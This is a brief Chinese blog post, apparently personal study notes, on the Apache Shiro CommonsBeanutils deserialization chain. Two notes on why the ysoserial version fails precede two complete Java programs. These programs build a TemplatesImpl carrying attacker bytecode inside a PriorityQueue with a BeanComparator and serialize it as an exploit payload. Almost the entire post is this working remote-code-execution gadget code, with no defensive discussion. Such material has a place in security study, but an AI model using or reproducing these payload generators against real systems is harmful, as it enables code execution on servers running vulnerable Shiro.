---
title: ShiroCB
date: 2026-03-08 14:04:39
updated: 2026-03-13 07:35:25
tags:
  - Web
  - java
  - 反序列化
  - Shiro
---
-   yso 中的链子打不通是因为 yso 中 cb 版本为 1.9，而 shiro 自带为 1.8.3，`serialVersionUID`报错
-   commons-beanutils依赖于commons-collections，但是正常使用Shiro的时候不需要依赖于commons-collections导致报错。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class ShiroCB {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        String path = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        byte[] code = Files.readAllBytes(Paths.get(path));
        byte[][] codes = {code};

        Class c = templates.getClass();
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        BeanComparator beancomparator = new BeanComparator("outputProperties",String.CASE_INSENSITIVE_ORDER);//BeanComparator构造器第二个参数不填会无CC依赖报错

        PriorityQueue priorityQueue = new PriorityQueue<>();

        priorityQueue.add(1);
        priorityQueue.add(1);

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue, new Object[]{templates,2});

        Class<PriorityQueue> Clazz = PriorityQueue.class;
        Field comparator = Clazz.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, beancomparator);

        serialize(priorityQueue);
        //unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}
```
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class ShiroCB {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        String path = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        byte[] code = Files.readAllBytes(Paths.get(path));
        byte[][] codes = {code};

        Class c = templates.getClass();
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        BeanComparator beancomparator = new BeanComparator("outputProperties",String.CASE_INSENSITIVE_ORDER);//BeanComparator构造器第二个参数不填会无CC依赖报错

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(1);

        Class<PriorityQueue> Clazz = PriorityQueue.class;
        Field comparator = Clazz.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, beancomparator);

        serialize(priorityQueue);
        //unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```